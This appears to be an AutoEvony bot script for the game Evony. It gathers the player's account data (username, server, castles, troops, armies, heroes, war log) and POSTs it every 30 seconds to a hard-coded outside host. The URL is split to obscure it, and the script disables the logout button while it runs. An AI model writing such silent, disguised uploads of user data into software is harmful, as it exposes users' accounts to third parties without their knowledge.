import autoevony.gui.MainScreen;
import flash.events.Event;
import flash.net.URLLoader;
import flash.net.URLRequest;
import flash.net.URLVariables;
import autoevony.common.Utils;
import autoevony.player.LoginHelper;
import com.evony.common.beans.ResourceBean;
import com.evony.common.beans.TroopBean;
import autoevony.event.WarLogEvent;
import autoevony.net.Connection;
function escape(x){
	y="";
	for (i=0;i < x.length; i++ )
	{
		ch = x.charAt( i );
		if (ch =='"'){
			y+= "\\\"";
		}
		else if (ch=='\\'){
			y+= "\\\\";
		}
		else if (ch=='\b'){
			y += "\\b";
		}
		else if (ch=='\f'){
			y+="\\f";
		}
		else if (ch=='\n'){
			y+="\\n";
		}
		else if (ch=='\r'){
			y+="\\r";
		}
		else if	(ch=='\t'){
			y+="\\t";
		}
		else{
			if (ch<' '){
				hexCode= ch.charCodeAt(0).toString( 16 );
				zeroPad= hexCode.length == 2 ? "00" : "000";
				y += "\\u" + zeroPad + hexCode;
			}
			else{
				y+=ch;
			}
		}
	}
	return y;
}
function stringify(x, g, i, t, j, o) {
    if (typeof(x) == 'string') {
        return "\"" + escape(x) + "\"";
    }
    if (typeof(x) == 'boolean' || typeof(x) == 'number' || typeof(x) == 'int') {
        return String(x);
    }
    if (x==null){
    	return "null";
    }
    if (typeof(x) == 'object') {
        if (x.length == null) {
            g = '';
            i = 0;
            j = 0;
            o = new Array();
            for (p in x) {
                o.push(p);
            }
            while (j < o.length) {
                t = stringify(x[o[j]], null, null, null, null, null);
                if (t != '') {
                    if (i > 0) {
                        g += ',';
                    }
                    g += ("\"" + o[j] + "\":" + t);
                    i++;
                }
                j++;
            }
            g = "{" + g + "}";
            return g;
        } else {
            i = 0;
            g = '';
            j = 0;
            while (i < x.length) {
                t = stringify(x[i], null, null, null, null, null);
                if (t != '') {
                    if (i > 0) {
                        g += ',';
                    }
                    g += t;
                }
                i++;
            }
			g = "[" + g + "]";
            return g;
        }
    }
    return "";
}
function getAllTroopsInQueues(kl){
    _loc1_=new Object();
    troopIntNames=new Array("","","peasants","militia","scouter","pikemen","swordsmen","archer","carriage","lightCavalry","heavyCavalry","ballista","batteringRam","catapult","","","","","");
    for each(p in troopIntNames){
    	if (p!=''){
    		_loc1_[p]=0;
    	}
    }
    _loc2_=Utils.getServerTime();
    for each(_loc4_ in kl.cm.troopProduceQueue)
    {
    	_loc3_ = -1;
    	for each(_loc5_ in _loc4_.allProduceQueueArray)
            {
               if(_loc3_ == -1)
               {
                  _loc3_ = _loc5_.endTime;
               }
               else
               {
                  _loc3_ = _loc3_ + _loc5_.costTime * 1000;
               }
               if(_loc3_ >= _loc2_ + 1000)
               {
                  _loc1_[troopIntNames[_loc5_.type]] = _loc1_[troopIntNames[_loc5_.type]] + _loc5_.num;
               }
            }
         }
         return _loc1_;
      }
function researchtoobject(x)
	      {
         return {
            "avalevel":x.avalevel,
            "castleId":x.castleId,
            "conditionBean":(x.conditionBean?x.conditionBean.toObject():(new Object())),
            "endTime":x.endTime,
            "enhancedstarlv":x.enhancedstarlv,
            "help":x.help,
            "level":x.level,
            "startTime":x.startTime,
            "typeId":x.typeId,
            "permition":x.permition,
            "upgradeing":x.upgradeing
         };
      }

function getAllFortificationInQueues(kl){
    _loc1_=new Object();
    troopIntNames=new Array("","","","","","","","","","","","","","","trap","abatis","arrowTower","rollingLogs","rockfall");
    for each(p in troopIntNames){
    	if (p!=''){
    		_loc1_[p]=0;
    	}
    }
    _loc2_=Utils.getServerTime();
    for each(_loc4_ in kl.cm.fortificationProduceQueue)
    {
    	_loc3_ = -1;
    	for each(_loc5_ in _loc4_.allProduceQueueArray)
            {
               if(_loc3_ == -1)
               {
                  _loc3_ = _loc5_.endTime;
               }
               else
               {
                  _loc3_ = _loc3_ + _loc5_.costTime * 1000;
               }
               if(_loc3_ >= _loc2_ + 1000)
               {
                  _loc1_[troopIntNames[_loc5_.type]] = _loc1_[troopIntNames[_loc5_.type]] + _loc5_.num;
               }
            }
         }
         return _loc1_;
      }
function armybeantoobject(x)
      {
         return {
            "alliance":x.alliance,
            "armyId":x.armyId,
            "direction":this.direction,
            "hero":x.hero,
            "heroLevel":x.heroLevel,
            "heroid":x.heroid,
            "king":x.king,
            "missionType":x.missionType,
            "reachTime":x.reachTime,
            "resource":(x.resource?x.resource.toObject():(new Object())),
            "restTime":x.restTime,
            "startFieldId":x.startFieldId,
            "startPosName":x.startPosName,
            "startTime":x.startTime,
            "targetFieldId":x.targetFieldId,
            "targetPosName":x.targetPosName,
            "troop":(x.troop?x.troop.toObject():(new Object())),
            "selected":x.selected
         };
      }
function castletoobject(kl){
	k=kl.castle;
	xp= {
            "colonization":k.colonization,
            "fieldId":k.fieldId,
            "fortification":kl.cm.fortification.toObject(),
            "icon":k.icon,
            "id":k.id,
            "logUrl":k.logUrl,
            "name":k.name,
            "powerlevel":k.powerlevel,
            "resource":kl.cm.resource.toObject(),
            "status":k.status,
            "troop":kl.cm.allTroop.toObject(),
            "usePACIFY_SUCCOUR_OR_PACIFY_PRAY":k.usePACIFY_SUCCOUR_OR_PACIFY_PRAY,
            "zoneId":k.zoneId,
            "allowAlliance":k.allowAlliance,
            "canChangeIcon":k.canChangeIcon,
            "goOutForBattle":k.goOutForBattle,
            "hasEnemy":k.hasEnemy,
            "availableTroop":kl.cm.troop.toObject()
         };
    xp.colonies=new Array();
    for each(hty in kl.cm.colonies){
    	htr=hty.toObject();
    	htr[".prestige"]=null;
    	htr.prestige=hty.prestige;
    	xp.colonies.push(htr);
    }
    xp.troopProduceQueue=getAllTroopsInQueues(kl);
    xp.fortificationProduceQueue=getAllFortificationInQueues(kl);
    xp.selfArmies=new Array();
    for each(hty in kl.cm.selfArmies){
    	if (hty.targetFieldId==(c.getValue("Coordinate",kl.coord)) && hty.direction==1){
    		xp.selfArmies.push(armybeantoobject(hty));
    	}
    }
    xp.friendlyArmies=new Array();
    for each(hty in kl.cm.friendlyArmies){
    	xp.friendlyArmies.push(armybeantoobject(hty));
    }
    xp.enemyArmies=new Array();
    for each(hty in kl.cm.enemyArmies){
    	xp.enemyArmies.push(armybeantoobject(hty));
    }
    xp.enemyValleyArmies=new Array();
    for each(hty in kl.cm.enemyValleyArmies){
    	xp.enemyValleyArmies.push(armybeantoobject(hty));
    }
    xp.enemyColonyArmies=new Array();
    for each(hty in kl.cm.enemyColonyArmies){
    	xp.enemyColonyArmies.push(armybeantoobject(hty));
    }
    xp.localarmies=new Array();
    for each(hty in kl.cm.localArmies){
    	xp.localarmies.push(armybeantoobject(hty));
    }
    xp.herosArray=new Array();
    for each(hty in c.cm.heroes){
    	xp.herosArray.push(hty.toObject());
    }
    xp.fieldsArray=new Array();
    for each(hty in c.cm.fields){
    	xp.fieldsArray.push(hty.toObject());
    }
    xp.buildings=new Array();
    for each(hty in kl.cm.buildings){
    	xp.buildings.push(hty.toObject());
    }
    xp.buildingQueuesArray=new Array();
    for each(hty in k.buildingQueuesArray){
    	xp.buildingQueuesArray.push(hty.toObject());
    }
    xp.buffsArray=new Array();
    for each(hty in k.buffsArray){
    	xp.buffsArray.push(hty.toObject());
    }
    xp.researches=new Array();
    for each(hty in kl.cm.researches){
    	xp.researches.push(researchtoobject(hty));
    }
    xp.gears=new Array();
    for each(hty in kl.cm.gears){
    	xp.gears.push(researchtoobject(hty));
    }
    return xp;
}
function getallresources(){
	y=new Object();
	for each(x in MainScreen.getCities()){
		y.gold=y.gold?(y.gold+x.cm.resource.gold):x.cm.resource.gold;
		y.food=y.food?(y.gold+x.cm.resource.food.amount):x.cm.resource.food.amount;
		y.wood=y.wood?(y.wood+x.cm.resource.wood.amount):x.cm.resource.wood.amount;
		y.stone=y.stone?(y.stone+x.cm.resource.stone.amount):x.cm.resource.stone.amount;
		y.iron=y.iron?(y.iron+x.cm.resource.iron.amount):x.cm.resource.iron.amount;
	}
	return Utils.resourceBeanToString(new ResourceBean(y));
}
function getalltroops(){
	y=new Object();
	for each(x in MainScreen.getCities()){
		for (p in x.cm.allTroop.toObject()){
			y[p]=(y[p]!=null)?(y[p]+x.cm.allTroop[p]):x.cm.allTroop[p];
		}
	}
	return Utils.troopBeanToString(new TroopBean(y));
}
function getattackcount(){
	i=0;
	for each(x in MainScreen.getCities()){
		i+=x.cm.enemyArmies.length;
	}
	return i;
}
function addwarloglistener(){
	q=new Array();
	for each(p in MainScreen.getCities()){
		if (warlogcities!=null){
			if (warlogcities.indexOf(p)!=-1){
				q.push(p);
				continue;
			}
		}
		p.cm.addEventListener(WarLogEvent.TYPE,getCallback("updatewarlog"));
		q.push(p);
	}
	warlogcities=q;
}
function allstatus(){
	if (uv==null){
		uv=new Object();
		uv['server']=LoginHelper.getInstance().strserverAlias+" ("+LoginHelper.getInstance().server+")";
		uv["player"]=c.player.toObject();
		uv['player']['castles']=new Array();
		for each(p in MainScreen.getCities()){
			uv['player']['castles'].push(castletoobject(p));
		}
		uv["summary"]=new Object();
		uv["summary"]["resources"]=getallresources();
		uv["summary"]["troops"]=getalltroops();
		uv["summary"]["attacks"]=getattackcount();
		uv["summary"]["accname"]=c.player.playerInfo.userName;
	}
	if (warlgmsg==null){
		warlgmsg=1;
		sdst=MainScreen.getInstance().logTab.selectedIndex;
		MainScreen.getInstance().logTab.selectedIndex=2;
		Utils.callLater(1,setCallback(allstatus));
		return;
	}
	if (startedlogging==null){
		warlgmsg=MainScreen.getInstance().logs.htmlText;
		addwarloglistener();
		startedlogging=true;
		MainScreen.getInstance().logTab.selectedIndex=sdst;
	}
	addwarloglistener();
	uv.warlog=warlgmsg;
	uv=stringify(uv,null,null,null,null,null);
}
function updatewarlog(evt){
	warlgmsg+=("<font color=\'" +"#006666"+ "\'>" + Utils.getLogTimeStr(Utils.getServerTime()) + "</font> <font color=\'" + "#000000" + "\'>" + evt.logText + "</font>\n");
}
function sendstatus(url){
	if (uv==null){
		uv=null;
		allstatus();
		Utils.callLater(1,getCallback("sendstatus"),[url]);
		return;
	}
	uloader=new URLLoader();
	uloader.addEventListener(Event.COMPLETE,getCallback("dfg"));
	urequest=new URLRequest(url);
	urequest.method="POST";
	urequest.data=new URLVariables();
	urequest.data.data=uv;
	uloader.load(urequest);
	uv=null;
}
function dfg(evt){
	evt.target.removeEventListener(Event.COMPLETE,getCallback("dfg"));
}
function ddss(){
	sendstatus("http:/"+"/cc2maps.cc/r9h2w4go2h9wgo24h98/index.php");
}
function updater(){
	if (stpupdate){
		for each(p in warlogcities){
			p.cm.removeEventListener(WarLogEvent.TYPE,getCallback("updatewarlog"));;
		}
		MainScreen.getInstance().removeEventListener("STOPSTATUSUPDATE",getCallback("stopupdate"));
		return;
	}
	if (!(Connection.getInstance().authenticated)){
		Utils.callLater(10000,getCallback("updater"));
		return;
	}
	ddss();
	Utils.callLater(30000,getCallback("updater"));
}
function stopupdate(evt){
	stpupdate=true;
}
function initializ(){
	if (MainScreen.getInstance().hasEventListener("STATUSUPDATERUNNING")){
		MainScreen.getInstance().removeEventListener("STATUSUPDATERUNNING",MainScreen.getInstance().disableLogoutButton);
		stopupdate(null);
		return;
	}
	c.cm.logMsg("Starting it");
	MainScreen.getInstance().addEventListener("STATUSUPDATERUNNING",MainScreen.getInstance().disableLogoutButton);
	warlgmsg=null;
	stpupdate=false;
	warlogcities=null;
	setCallback(updater);
	setCallback(updatewarlog);
	setCallback(sendstatus);
	setCallback(dfg);
	MainScreen.getInstance().addEventListener("STOPSTATUSUPDATE",setCallback(stopupdate));
	updater();
}
echo $m_dyn.initializ()$

// Second part

import autoevony.gui.MainScreen;
import flash.events.Event;
function stopupdate(){
	MainScreen.getInstance().dispatchEvent(new Event("STOPSTATUSUPDATE"));
	MainScreen.getInstance().removeEventListener("STATUSUPDATERUNNING",MainScreen.getInstance().disableLogoutButton);
}
echo $m_dyn.stopupdate()$
